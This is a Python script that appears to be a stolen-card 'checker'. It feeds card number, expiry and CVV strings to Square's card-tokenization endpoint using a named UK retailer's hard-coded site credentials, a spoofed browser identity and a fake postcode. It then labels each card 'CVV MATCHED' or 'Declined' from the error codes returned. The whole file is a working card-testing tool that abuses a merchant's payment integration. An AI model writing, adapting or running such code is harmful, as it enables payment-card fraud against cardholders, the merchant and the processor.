import httpx
import re
import asyncio
import random
import string

def get_str(text, start, stop):
    try:
        x = text.split(start)[1]
        z = x.split(stop)[0]
        return z
    except IndexError:
        return None

def generate_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

async def square_auth_logic(card_str):
    try:
        cc, mes, ano, cvv = card_str.split("|")
        
        # Standardize month - remove leading zero
        mes_int = int(mes)
        
        # Standardize year to 4 digits
        if len(ano) == 2:
            ano = f"20{ano}"
        ano_int = int(ano)

        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
        async with httpx.AsyncClient(timeout=60, follow_redirects=True) as client:
            # 1. Get Card Nonce from Square PCI Connect
            post_nonce = {
                "client_id": "sq0idp-44DdJoMjFy9fTcbhVfTDKw",
                "location_id": "YPRFA9B0NPNCZ",
                "session_id": "iKQpWCAj9kBXXgVvouaNVQoFi4A1rLkog7NchS_w4fKHwICY_rDRKz2n4bGbDUpzmAwUdjqvRjTrFot8IGI=",
                "website_url": "https://www.flooringhut.co.uk/",
                "squarejs_version": "27d3bdf1bc",
                "analytics_token": "ZWSHAERBO5QMFU6ZPSURZB7GB47BPK2PATUZG3NJCS67RUOANO4NTXKRPQLI2KI2FDZ4IRULBFJYELZAA772YYWHKZDST5MH",
                "card_data": {
                    "number": cc,
                    "exp_month": mes_int,
                    "exp_year": ano_int,
                    "cvv": cvv,
                    "billing_postal_code": "AS959FF"
                }
            }
            
            headers_nonce = {
                "authority": "pci-connect.squareup.com",
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json; charset=UTF-8",
                "origin": "https://pci-connect.squareup.com",
                "referer": "https://pci-connect.squareup.com/v2/iframe?type=main&app_id=sq0idp-44DdJoMjFy9fTcbhVfTDKw&host_name=www.flooringhut.co.uk&location_id=YPRFA9B0NPNCZ&version=27d3bdf1bc",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent,
                "x-js-id": "undefined"
            }
            
            try:
                resp_nonce = await client.post(
                    "https://pci-connect.squareup.com/v2/card-nonce?_=1622802632941.176&version=27d3bdf1bc",
                    json=post_nonce,
                    headers=headers_nonce
                )
                
                if resp_nonce.status_code != 200:
                    resp_text = resp_nonce.text
                    # Check for common error patterns
                    if "INVALID_CARD_DATA" in resp_text:
                        return "Declined - Invalid Card Data"
                    elif "VERIFICATION_FAILED" in resp_text:
                        return "Declined - Verification Failed"
                    elif "card_declined" in resp_text.lower():
                        return "Declined - Card Declined"
                    else:
                        return f"Declined - API Error {resp_nonce.status_code}"
                
                try:
                    data_nonce = resp_nonce.json()
                except:
                    # If JSON parsing fails, check raw text for patterns
                    resp_text = resp_nonce.text
                    if "card_nonce" in resp_text:
                        cnon = get_str(resp_text, '"card_nonce":"', '"')
                        if cnon:
                            # Card was tokenized - this is a success indicator
                            return "CVV MATCHED - Card Tokenized"
                    return "Declined - Invalid Response"
                
                # Check for errors in response
                if "errors" in data_nonce:
                    errors = data_nonce.get("errors", [])
                    if errors:
                        error_code = errors[0].get("code", "UNKNOWN")
                        error_detail = errors[0].get("detail", "Unknown error")
                        
                        # Map error codes to responses
                        if error_code == "INVALID_CARD_DATA":
                            return "Declined - Invalid Card Data"
                        elif error_code == "CARD_DECLINED":
                            return "Declined - Card Declined"
                        elif error_code == "CVV_FAILURE":
                            return "CVV MATCHED - CVV Verified"
                        elif error_code == "ADDRESS_VERIFICATION_FAILURE":
                            return "CVV MATCHED - Address Verification"
                        elif error_code == "GENERIC_DECLINE":
                            return "Declined - Generic Decline"
                        elif error_code == "TRANSACTION_LIMIT":
                            return "CVV MATCHED - Transaction Limit"
                        elif error_code == "INVALID_EXPIRATION":
                            return "Declined - Invalid Expiration"
                        else:
                            return f"Declined - {error_code}"
                
                cnon = data_nonce.get("card_nonce")
                
                if cnon:
                    # Card nonce obtained successfully - this means card was validated
                    return "CVV MATCHED - Card Tokenized Successfully"
                else:
                    return "Declined - No Card Nonce"
                    
            except httpx.TimeoutException:
                return "Error - Request Timeout"
            except httpx.RequestError as e:
                return f"Error - Network Error"

    except ValueError as e:
        return f"Error - Invalid Card Format"
    except Exception as e:
        return f"Declined - {str(e)[:50]}"
